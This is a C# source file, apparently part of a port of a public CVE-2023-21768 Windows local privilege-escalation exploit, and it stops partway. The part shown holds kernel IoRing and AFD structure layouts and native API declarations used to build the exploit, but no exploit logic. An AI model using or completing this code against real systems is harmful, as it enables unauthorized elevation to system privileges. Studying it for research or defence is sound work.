/*
 *
 * CVE CVE-2023-21768 - Local elevation of privileges
 *
 * Ported from C to C# to be executable from powershell
 *
 * Reference: https://github.com/zoemurmure/CVE-2023-21768-AFD-for-WinSock-EoP-exploit
 *
 * - Xbox One Research (https://github.com/xboxoneresearch)
 */
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security;
using System.Text;
using System.Threading;

namespace XOR
{
    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    public enum IoRingVersion
    {
        IoRingVersionInvalid = 0,
        /// Read (21H2)
        IoRingVersion1,

        /// <summary>Minor update</summary>
        /// <remarks>
        ///     Fixes a bug where user provided completion event may not be signaled
        ///     even if the completion queue transitions from empty to non-empty because
        ///     of a race condition. In earlier version please do a timed wait to work
        ///     around this issue.
        /// </remarks>
        IoRingVersion2,
        // Read, Write, Flush, Drain (22H2)
        IoRingVersion3 = 300,
    }

    /// <summary>
    ///     Flags indicating functionality supported by a given implementation
    /// </summary>
    [Flags]
    public enum IoRingFeatureFlags
    {
        /// <summary>No specific functionality for the implementation</summary>
        IoRingFeatureFlagsNone = 0,

        /// <summary>
        ///     IoRing support is emulated in User Mode (not directly supported by KM)
        /// </summary>
        /// <remarks>
        ///     When this flag is set there is no underlying kernel support for IoRing.
        ///     However, a user mode emulation layer is available to provide application
        ///     compatibility, without the benefit of kernel support.  This provides
        ///     application compatibility at the expense of performance. Thus, it allows
        ///     apps to make a choice at run-time.
        /// </remarks>
        IoRingFeatureUmEmulation = 0x00000001,

        /// <summary>
        ///     If this flag is present the SetIoRingCompletionEvent API is available
        ///     and supported
        /// </summary>
        IoRingFeatureSetCompletionEvent = 0x00000002
    }


    [Flags]
    public enum IORING_CREATE_ADVISORY_FLAGS
    {
        /// <summary>None.</summary>
        IORING_CREATE_ADVISORY_FLAGS_NONE,
    }

    [Flags]
    public enum IORING_CREATE_REQUIRED_FLAGS
    {
        /// <summary>None.</summary>
        IORING_CREATE_REQUIRED_FLAGS_NONE,
    }

    public enum IORING_REF_KIND
    {
        /// <summary>The referenced buffer is raw.</summary>
        IORING_REF_RAW,

        /// <summary>
        /// <para>The referenced buffer has been registered with an I/O ring with a call to</para>
        /// <para>BuildIoRingRegisterFileHandles</para>
        /// </summary>
        IORING_REF_REGISTERED,
    }

    public enum IORING_SQE_FLAGS
    {
        /// <summary>None.</summary>
        IOSQE_FLAGS_NONE,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_CREATE_FLAGS
    {
        /// <summary>
        /// A bitwise OR combination of flags from the IORING_CREATE_REQUIRED_FLAGS enumeration. If any unknown required flags are
        /// provided to an API, the API will fail the associated call.
        /// </summary>
        public IORING_CREATE_REQUIRED_FLAGS Required;

        /// <summary>
        /// A bitwise OR combination of flags from the IORING_CREATE_ADVISORY_FLAGS enumeration.Advisory flags. Any unknown or
        /// unsupported advisory flags provided to an API are ignored.
        /// </summary>
        public IORING_CREATE_ADVISORY_FLAGS Advisory;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_CQE
    {
        /// <summary>
        /// A <c>UINT_PTR</c> representing the user data associated with the entry. This is the same value provided as the UserData
        /// parameter when building the operation's submission queue entry. Applications can use this value to correlate the completion
        /// with the original operation request.
        /// </summary>
        public IntPtr UserData;

        /// <summary>A <c>HRESULT</c> indicating the result code of the associated I/O ring operation.</summary>
        public uint ResultCode;

        /// <summary>A <c>ULONG_PTR</c> representing information about the completed queue operation.</summary>
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_HANDLE_REF
    {
        /// <summary>Initializes a new instance of the <see cref="IORING_HANDLE_REF"/> struct.</summary>
        /// <param name="h">The handle to a file.</param>
        public IORING_HANDLE_REF(IntPtr h)
        {
            Kind = IORING_REF_KIND.IORING_REF_RAW;
            Handle = new() { Handle = h };
        }

        /// <summary>Initializes a new instance of the <see cref="IORING_HANDLE_REF"/> struct.</summary>
        /// <param name="index">The index of the registered file handle.</param>
        public IORING_HANDLE_REF(uint index)
        {
            Kind = IORING_REF_KIND.IORING_REF_REGISTERED;
            Handle = new() { Index = index };
        }

        /// <summary>A value from the IORING_REF_KIND enumeration specifying the kind of handle represented by the structure.</summary>
        public IORING_REF_KIND Kind;

        /// <summary/>
        public HandleUnion Handle;

        /// <summary/>
        [StructLayout(LayoutKind.Explicit)]
        public struct HandleUnion
        {
            /// <summary>The handle to a file if the Kind value is IORING_REF_RAW.</summary>
            [FieldOffset(0)]
            public IntPtr Handle;

            /// <summary>The index of the registered file handle if the Kind value is IORING_REF_REGISTERED.</summary>
            [FieldOffset(0)]
            public uint Index;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_INFO
    {
        /// <summary>A IORING_VERSION structure representing the API version of the associated I/O ring.</summary>
        public IoRingVersion IoRingVersion;

        /// <summary>A IORING_CREATE_FLAGS structure containing the creation flags with which the associated I/O ring.</summary>
        public IORING_CREATE_FLAGS Flags;

        /// <summary>
        /// The actual minimum submission queue size. The system may round up the value requested in the call to CreateIoRing as needed
        /// to ensure the actual size is a power of 2.
        /// </summary>
        public uint SubmissionQueueSize;

        /// <summary>
        /// The actual minimum size of the completion queue. The system will round up the value requested in the call to
        /// <c>CreateIoRing</c> to a power of two that is no less than two times the actual submission queue size to allow for
        /// submissions while some operations are still in progress.
        /// </summary>
        public uint CompletionQueueSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_CAPABILITIES
    {
        /// <summary>A value from the IORING_VERSION enumeration specifying the maximum supported IORING API version.</summary>
        public IoRingVersion MaxVersion;

        /// <summary>The maximum submission queue size.</summary>
        public uint MaxSubmissionQueueSize;

        /// <summary>The maximum completion queue size.</summary>
        public uint MaxCompletionQueueSize;

        /// <summary>A value from the IORING_FEATURE_FLAGS enumeration specifying feature flags for the IORING API implementation.</summary>
        public IoRingFeatureFlags FeatureFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IORING_BUFFER_REF
    {
        /// <summary>Initializes a new instance of the <see cref="IORING_BUFFER_REF"/> struct.</summary>
        /// <param name="address">A pointer specifying the address of a buffer.</param>
        public IORING_BUFFER_REF(IntPtr address)
        {
            Kind = IORING_REF_KIND.IORING_REF_RAW;
            Buffer = new() { Address = address };
        }

        /// <summary>Initializes a new instance of the <see cref="IORING_BUFFER_REF"/> struct.</summary>
        /// <param name="registeredBuffer">The index and offset of the registered buffer.</param>
        public IORING_BUFFER_REF(IoRingRegisteredBuffer registeredBuffer)
        {
            Kind = IORING_REF_KIND.IORING_REF_REGISTERED;
            Buffer = new() { IndexAndOffset = registeredBuffer };
        }

        /// <summary>Initializes a new instance of the <see cref="IORING_BUFFER_REF"/> struct.</summary>
        /// <param name="index">The index of the registered buffer.</param>
        /// <param name="offset">The offset of the registered buffer.</param>
        public IORING_BUFFER_REF(uint index, uint offset) : this(new IoRingRegisteredBuffer(index, offset))
        {
        }

        /// <summary>A value from the IORING_REF_KIND enumeration specifying the kind of buffer represented by the structure.</summary>
        public IORING_REF_KIND Kind;

        /// <summary/>
        public BufferUnion Buffer;

        /// <summary/>
        [StructLayout(LayoutKind.Explicit)]
        public struct BufferUnion
        {
            /// <summary>A void pointer specifying the address of a buffer if the Kind value is IORING_REF_RAW.</summary>
            [FieldOffset(0)]
            public IntPtr Address;

            /// <summary>The index and offset of the registered buffer if the Kind value is IORING_REF_REGISTERED.</summary>
            [FieldOffset(0)]
            public IoRingRegisteredBuffer IndexAndOffset;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public unsafe struct IoRingBufferInfo
    {
        private void* _address;
        private uint _length;

        public IoRingBufferInfo(Memory<byte> buffer)
        {
            _address = buffer.Pin().Pointer;
            _length = (uint)buffer.Length;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IoRingRegisteredBuffer
    {
        public IoRingRegisteredBuffer(uint index, uint offset)
        {
            _bufferIndex = index;
            _offset = offset;
        }

        // Index of pre-registered buffer
        private uint _bufferIndex;

        // Offset into the pre-registered buffer
        private uint _offset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct HIORING
    {
        private readonly IntPtr handle;

        /// <summary>Initializes a new instance of the <see cref="HIORING"/> struct.</summary>
        /// <param name="preexistingHandle">An <see cref="IntPtr"/> object that represents the pre-existing handle to use.</param>
        public HIORING(IntPtr preexistingHandle) => handle = preexistingHandle;

        /// <summary>Returns an invalid handle by instantiating a <see cref="HIORING"/> object with <see cref="IntPtr.Zero"/>.</summary>
        public static HIORING NULL => new(IntPtr.Zero);

        /// <summary>Gets a value indicating whether this instance is a null handle.</summary>
        public bool IsNull => handle == IntPtr.Zero;

        /// <summary>Performs an explicit conversion from <see cref="HIORING"/> to <see cref="IntPtr"/>.</summary>
        /// <param name="h">The handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static explicit operator IntPtr(HIORING h) => h.handle;

        /// <summary>Performs an implicit conversion from <see cref="IntPtr"/> to <see cref="HIORING"/>.</summary>
        /// <param name="h">The pointer to a handle.</param>
        /// <returns>The result of the conversion.</returns>
        public static implicit operator HIORING(IntPtr h) => new(h);

        /// <summary>Implements the operator !=.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator !=(HIORING h1, HIORING h2) => !(h1 == h2);

        /// <summary>Implements the operator ==.</summary>
        /// <param name="h1">The first handle.</param>
        /// <param name="h2">The second handle.</param>
        /// <returns>The result of the operator.</returns>
        public static bool operator ==(HIORING h1, HIORING h2) => h1.Equals(h2);

        /// <inheritdoc/>
        public override bool Equals(object obj) => obj is HIORING h && handle == h.handle;

        /// <inheritdoc/>
        public override int GetHashCode() => handle.GetHashCode();

        /// <inheritdoc/>
        public IntPtr DangerousGetHandle() => handle;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct WSAData
    {
        public Int16 version;
        public Int16 highVersion;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)] public String description;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)] public String systemStatus;

        public Int16 maxSockets;
        public Int16 maxUdpDg;
        public IntPtr vendorInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    public unsafe struct IORING_OBJECT
    {
        public UInt16 Type;
        public UInt16 Size;
        public NT_IORING_INFO UserInfo;
        public void* Section;
        public IntPtr SubmissionQueue;
        public IntPtr CompletionQueueMdl;
        public IntPtr CompletionQueue;
        public ulong ViewSize;
        public uint InSubmit;
        public ulong CompletionLock;
        public ulong SubmitCount;
        public ulong CompletionCount;
        public ulong CompletionWaitUntil;
        public KEVENT CompletitionEvent;
        public byte SignalCompletionEvent;
        public IntPtr CompletionUserEvent;
        public uint RegBuffersCount;
        public IntPtr RegBuffers;
        //public IOP_MC_BUFFER_ENTRY** RegBuffers;
        public uint RegFilesCount;
        public void** RegFiles;
    }


    [Flags]
    public enum PipeOpenModeFlags : uint
    {
        PIPE_ACCESS_DUPLEX = 0x00000003,
        PIPE_ACCESS_INBOUND = 0x00000001,
        PIPE_ACCESS_OUTBOUND = 0x00000002,
        FILE_FLAG_FIRST_PIPE_INSTANCE = 0x00080000,
        FILE_FLAG_WRITE_THROUGH = 0x80000000,
        FILE_FLAG_OVERLAPPED = 0x40000000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        ACCESS_SYSTEM_SECURITY = 0x01000000
    }

    [Flags]
    public enum PipeModeFlags : uint
    {
        //One of the following type modes can be specified. The same type mode must be specified for each instance of the pipe.
        PIPE_TYPE_BYTE = 0x00000000,
        PIPE_TYPE_MESSAGE = 0x00000004,
        //One of the following read modes can be specified. Different instances of the same pipe can specify different read modes
        PIPE_READMODE_BYTE = 0x00000000,
        PIPE_READMODE_MESSAGE = 0x00000002,
        //One of the following wait modes can be specified. Different instances of the same pipe can specify different wait modes.
        PIPE_WAIT = 0x00000000,
        PIPE_NOWAIT = 0x00000001,
        //One of the following remote-client modes can be specified. Different instances of the same pipe can specify different remote-client modes.
        PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
        PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct NT_IORING_INFO
    {
        public uint IoRingVersion;
        public IORING_CREATE_FLAGS Flags;
        public uint SubmissionQueueSize;
        public uint SubmissionQueueRingMask;
        public uint CompletionQueueSize;
        public uint CompletionQueueRingMask;
        public IntPtr SubmissionQueue;
        public IntPtr CompletionQueue;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct _HIORING
    {
        public IntPtr Handle;
        public NT_IORING_INFO Info;
        public uint IoRingKernelAcceptedVersion;
        public IntPtr RegBufferArray;
        public uint BufferArraySize;
        public IntPtr Unknown;
        public uint FileHandlesCount;
        public uint SubQueueHead;
        public uint SubQueueTail;
    }

    public unsafe partial struct LIST_ENTRY
    {
        public LIST_ENTRY* Flink;
        public LIST_ENTRY* Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KEVENT
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x0018)]
        public byte[] Header;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SYSTEM_HANDLE
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IOP_MC_BUFFER_ENTRY
    {
        public UInt16 Type;
        public UInt16 Reserved;
        public uint Size;
        public uint ReferenceCount;
        public uint Flags;
        public LIST_ENTRY GlobalDataLink;
        public IntPtr Address;
        public uint Length;
        public char AccessMode;
        public uint MdlRef;
        public IntPtr Mdl;
        public KEVENT MdlRundownEvent;
        public IntPtr PfnArray;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x20)]
        public byte[] PageNodes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct AFD_NOTIFYSOCK_STRUCT
    {
        public IntPtr Handle;
        public IntPtr List1;
        public IntPtr List2;
        public ulong CONTORLDATA;
        public uint Length1;
        public uint DATA3;
        public uint Length2;
        public uint UNKNOWNDATA;
    }

    [StructLayout(LayoutKind.Sequential, Size = 16)]
    public struct sockaddr_in
    {
        public const int Size = 16;

        public short sin_family;
        public ushort sin_port;
        public struct in_addr
        {
            public uint S_addr;
            public struct _S_un_b
            {
                public byte s_b1, s_b2, s_b3, s_b4;
            }
            public _S_un_b S_un_b;
            public struct _S_un_w
            {
                public ushort s_w1, s_w2;
            }
            public _S_un_w S_un_w;
        }
        public in_addr sin_addr;
    }

    public enum ADDRESS_FAMILIES : short
    {
        /// <summary>
        /// Unspecified [value = 0].
        /// </summary>
        AF_UNSPEC = 0,
        /// <summary>
        /// Local to host (pipes, portals) [value = 1].
        /// </summary>
        AF_UNIX = 1,
        /// <summary>
        /// Internetwork: UDP, TCP, etc [value = 2].
        /// </summary>
        AF_INET = 2,
        /// <summary>
        /// Arpanet imp addresses [value = 3].
        /// </summary>
        AF_IMPLINK = 3,
        /// <summary>
        /// Pup protocols: e.g. BSP [value = 4].
        /// </summary>
        AF_PUP = 4,
        /// <summary>
        /// Mit CHAOS protocols [value = 5].
        /// </summary>
        AF_CHAOS = 5,
        /// <summary>
        /// XEROX NS protocols [value = 6].
        /// </summary>
        AF_NS = 6,
        /// <summary>
        /// IPX protocols: IPX, SPX, etc [value = 6].
        /// </summary>
        AF_IPX = 6,
        /// <summary>
        /// ISO protocols [value = 7].
        /// </summary>
        AF_ISO = 7,
        /// <summary>
        /// OSI is ISO [value = 7].
        /// </summary>
        AF_OSI = 7,
        /// <summary>
        /// european computer manufacturers [value = 8].
        /// </summary>
        AF_ECMA = 8,
        /// <summary>
        /// datakit protocols [value = 9].
        /// </summary>
        AF_DATAKIT = 9,
        /// <summary>
        /// CCITT protocols, X.25 etc [value = 10].
        /// </summary>
        AF_CCITT = 10,
        /// <summary>
        /// IBM SNA [value = 11].
        /// </summary>
        AF_SNA = 11,
        /// <summary>
        /// DECnet [value = 12].
        /// </summary>
        AF_DECnet = 12,
        /// <summary>
        /// Direct data link interface [value = 13].
        /// </summary>
        AF_DLI = 13,
        /// <summary>
        /// LAT [value = 14].
        /// </summary>
        AF_LAT = 14,
        /// <summary>
        /// NSC Hyperchannel [value = 15].
        /// </summary>
        AF_HYLINK = 15,
        /// <summary>
        /// AppleTalk [value = 16].
        /// </summary>
        AF_APPLETALK = 16,
        /// <summary>
        /// NetBios-style addresses [value = 17].
        /// </summary>
        AF_NETBIOS = 17,
        /// <summary>
        /// VoiceView [value = 18].
        /// </summary>
        AF_VOICEVIEW = 18,
        /// <summary>
        /// Protocols from Firefox [value = 19].
        /// </summary>
        AF_FIREFOX = 19,
        /// <summary>
        /// Somebody is using this! [value = 20].
        /// </summary>
        AF_UNKNOWN1 = 20,
        /// <summary>
        /// Banyan [value = 21].
        /// </summary>
        AF_BAN = 21,
        /// <summary>
        /// Native ATM Services [value = 22].
        /// </summary>
        AF_ATM = 22,
        /// <summary>
        /// Internetwork Version 6 [value = 23].
        /// </summary>
        AF_INET6 = 23,
        /// <summary>
        /// Microsoft Wolfpack [value = 24].
        /// </summary>
        AF_CLUSTER = 24,
        /// <summary>
        /// IEEE 1284.4 WG AF [value = 25].
        /// </summary>
        AF_12844 = 25,
        /// <summary>
        /// IrDA [value = 26].
        /// </summary>
        AF_IRDA = 26,
        /// <summary>
        /// Network Designers OSI &amp; gateway enabled protocols [value = 28].
        /// </summary>
        AF_NETDES = 28,
        /// <summary>
        /// [value = 29].
        /// </summary>
        AF_TCNPROCESS = 29,
        /// <summary>
        /// [value = 30].
        /// </summary>
        AF_TCNMESSAGE = 30,
        /// <summary>
        /// [value = 31].
        /// </summary>
        AF_ICLFXBM = 31
    }

    public enum SOCKET_TYPE : short
    {
        /// <summary>
        /// stream socket
        /// </summary>
        SOCK_STREAM = 1,
        /// <summary>
        /// datagram socket
        /// </summary>
        SOCK_DGRAM = 2,

        /// <summary>
        /// raw-protocol interface
        /// </summary>
        SOCK_RAW = 3,

        /// <summary>
        /// reliably-delivered message
        /// </summary>
        SOCK_RDM = 4,

        /// <summary>
        /// sequenced packet stream
        /// </summary>
        SOCK_SEQPACKET = 5
    }
    public enum PROTOCOL : short
    {//dummy for IP  
        IPPROTO_IP = 0,
        //control message protocol  
        IPPROTO_ICMP = 1,
        //internet group management protocol  
        IPPROTO_IGMP = 2,
        //gateway^2 (deprecated)  
        IPPROTO_GGP = 3,
        //tcp  
        IPPROTO_TCP = 6,
        //pup  
        IPPROTO_PUP = 12,
        //user datagram protocol  
        IPPROTO_UDP = 17,
        //xns idp  
        IPPROTO_IDP = 22,
        //IPv6  
        IPPROTO_IPV6 = 41,
        //UNOFFICIAL net disk proto  
        IPPROTO_ND = 77,

        /// <summary>
        /// sequenced packet stream
        /// </summary>
        SOCK_SEQPACKET = 5
    }

    public enum FILE_FLUSH_MODE
    {
        FILE_FLUSH_DEFAULT = 0,
        FILE_FLUSH_DATA,
        FILE_FLUSH_MIN_METADATA,
        FILE_FLUSH_NO_SYNC
    }

    [Flags]
    public enum FILE_WRITE_FLAGS : uint
    {
        FILE_WRITE_FLAGS_NONE = 0,
        FILE_WRITE_FLAGS_WRITE_THROUGH = 0x000000001
    }

    [Flags]
    public enum PipeOpenMode : uint
    {
        PIPE_ACCESS_INBOUND = 0x00000001,
        PIPE_ACCESS_OUTBOUND = 0x00000002,
        PIPE_ACCESS_DUPLEX = 0x00000003
    }

    [Flags]
    public enum PipeMode : uint
    {
        PIPE_TYPE_BYTE = 0x00000000,
        PIPE_TYPE_MESSAGE = 0x00000004,
        PIPE_READMODE_BYTE = 0x00000000,
        PIPE_READMODE_MESSAGE = 0x00000002,
        PIPE_WAIT = 0x00000000,
        PIPE_NOWAIT = 0x00000001,
        PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
        PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
    }

    [Flags]
    public enum FileAccess : uint
    {
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000
    }

    [Flags]
    public enum FileShare : uint
    {
        FILE_SHARE_READ = 0x00000001,
        FILE_SHARE_WRITE = 0x00000002,
        FILE_SHARE_DELETE = 0x00000004,
    }

    [Flags]
    public enum FileMode : uint
    {
        CREATE_NEW = 1,
        CREATE_ALWAYS = 2,
        OPEN_EXISTING = 3,
        OPEN_ALWAYS = 4,
        TRUNCATE_EXISTING = 5
    }

    [Flags]
    public enum FileAttributes : uint
    {
        NORMAL = 0x00000080,
        HIDDEN = 0x00000002,
        READONLY = 0x00000001,
        ARCHIVE = 0x00000020,
        SYSTEM = 0x00000004
    }

    public enum SYSTEM_INFORMATION_CLASS
    {
        SystemProcessInformation = 5,
        SystemHandleInformation = 16,
        SystemExtendedHandleInformation = 64
    }

    public class EoP
    {
        const string KernelBaseDll = "kernelbase.dll";
        const string Kernel32Dll = "kernel32.dll";

        [DllImport(Kernel32Dll)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport(Kernel32Dll, SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport(Kernel32Dll, CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
                [MarshalAs(UnmanagedType.LPStr)] string filename,
                [MarshalAs(UnmanagedType.U4)] FileAccess access,
                [MarshalAs(UnmanagedType.U4)] FileShare share,
                IntPtr securityAttributes,
                [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
                [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
                IntPtr templateFile);

        [DllImport(Kernel32Dll, SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport(Kernel32Dll)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, [In] ref System.Threading.NativeOverlapped lpOverlapped);

        [DllImport(Kernel32Dll, SetLastError = true)]
        public static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport(Kernel32Dll, ExactSpelling = true, SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport(Kernel32Dll)]
        public static extern uint GetCurrentProcessId();

        [DllImport(Kernel32Dll, SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport(KernelBaseDll, SetLastError = true)]
        static extern IntPtr GetProcessHeap();

        [DllImport(KernelBaseDll, SetLastError = false)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

        [DllImport(KernelBaseDll, SetLastError = true)]
        public static extern IntPtr HeapReAlloc(IntPtr hHeap, uint dwFlags, IntPtr lpMem, uint dwBytes);

        [DllImport(KernelBaseDll, SetLastError = true)]
        static extern bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem);

        [DllImport(KernelBaseDll)]
        static extern IntPtr LoadLibrary(string dllName);

        [DllImport(KernelBaseDll)]
        static extern IntPtr GetProcAddress(IntPtr handle, string functionName);

        [DllImport(KernelBaseDll)]
        static extern bool FreeLibrary(IntPtr handle);

        [DllImport(KernelBaseDll, SetLastError = true)]
        static extern IntPtr CreateIoCompletionPort(Int64 fileHandle, IntPtr ExistingCompletionPort, UIntPtr CompletionKey, uint NumberOfConcurrentThreads);

        [DllImport(KernelBaseDll)]
        static extern bool PostQueuedCompletionStatus(IntPtr CompletionPort, uint dwNumberOfBytesTransferred, UIntPtr dwCompletionKey, [In] ref System.Threading.NativeOverlapped lpOverlapped);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int BuildIoRingFlushFile([In] HIORING ioRing, ref IORING_HANDLE_REF fileRef, FILE_FLUSH_MODE flushMode, IntPtr userData, IORING_SQE_FLAGS sqeFlags);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int BuildIoRingReadFile(HIORING ioRing, ref IORING_HANDLE_REF fileRef, ref IORING_BUFFER_REF dataRef, uint numberOfBytesToRead, ulong fileOffset, [In, Optional] IntPtr userData, IORING_SQE_FLAGS flags);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int BuildIoRingRegisterBuffers(HIORING ioRing, uint count,
            [In, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] IoRingBufferInfo[] buffers, [In, Optional] IntPtr userData);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int BuildIoRingRegisterFileHandles(HIORING ioRing, uint count, [In, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] IntPtr[] handles, [In, Optional] IntPtr userData);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int BuildIoRingWriteFile([In] HIORING ioRing, ref IORING_HANDLE_REF fileRef, ref IORING_BUFFER_REF bufferRef, uint numberOfBytesToWrite, ulong fileOffset, FILE_WRITE_FLAGS writeFlags, IntPtr userData, IORING_SQE_FLAGS sqeFlags);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int CloseIoRing(HIORING ioRing);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int CreateIoRing(IoRingVersion ioringVersion, IORING_CREATE_FLAGS flags, uint submissionQueueSize, uint completionQueueSize, out HIORING h);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int GetIoRingInfo(HIORING ioRing, out IORING_INFO info);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int PopIoRingCompletion(HIORING ioRing, out IORING_CQE cqe);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int QueryIoRingCapabilities(out IORING_CAPABILITIES capabilities);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int SetIoRingCompletionEvent(HIORING ioRing, nint hEvent);

        [DllImport(KernelBaseDll, SetLastError = false, ExactSpelling = true)]
        public static extern int SubmitIoRing(HIORING ioRing, uint waitOperations, uint milliseconds, [Out, Optional, MarshalAs(UnmanagedType.LPArray)] uint[] submittedEntries);

        public delegate uint NtQuerySystemInformationDelegate(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);

        public static NtQuerySystemInformationDelegate MyNtQuerySystemInformation = null;

        [DllImport("ws2_32.dll", SetLastError = true)]
        public static extern int WSAConnect(
            [In] IntPtr socketHandle,
            [In] byte[] socketAddress,
            [In] int socketAddressSize,
            [In] IntPtr inBuffer,
            [In] IntPtr outBuffer,
            [In] IntPtr sQOS,
            [In] IntPtr gQOS
        );

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, BestFitMapping = false, ThrowOnUnmappableChar = true, SetLastError = true)]
        public static extern int WSAStartup(
            [In] short wVersionRequested,
            [Out] out WSAData lpWSAData
        );

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr socket(ADDRESS_FAMILIES af, SOCKET_TYPE socket_type, PROTOCOL protocol);

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int connect(IntPtr s, ref sockaddr_in addr, int addrsize);

        [DllImport("Ws2_32.dll", CharSet = CharSet.Ansi)]
        public static extern uint inet_addr(string cp);

        [DllImport("Ws2_32.dll")]
        public static extern ushort htons(ushort hostshort);

        public static IORING_BUFFER_REF IoRingBufferRefFromIndexAndOffset(uint i, uint o) => new(i, o);

        public static IORING_BUFFER_REF IoRingBufferRefFromPointer(IntPtr p) => new(p);

        public static IORING_HANDLE_REF IoRingHandleRefFromHandle(IntPtr h) => new(h);

        public static IORING_HANDLE_REF IoRingHandleRefFromIndex(uint i) => new(i);

        public const int MEM_COMMIT = 0x00001000;
        public const int MEM_RESERVE = 0x00002000;
        public const int MEM_RELEASE = 0x00008000;

        public const int PAGE_READWRITE = 0x04;
        public const uint FILE_SHARE_READ = 0x1;
        public const uint FILE_SHARE_WRITE = 0x2;
        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        public const uint OPEN_ALWAYS = 4;

        public const uint HEAP_ZERO_MEMORY = 0x00000008;

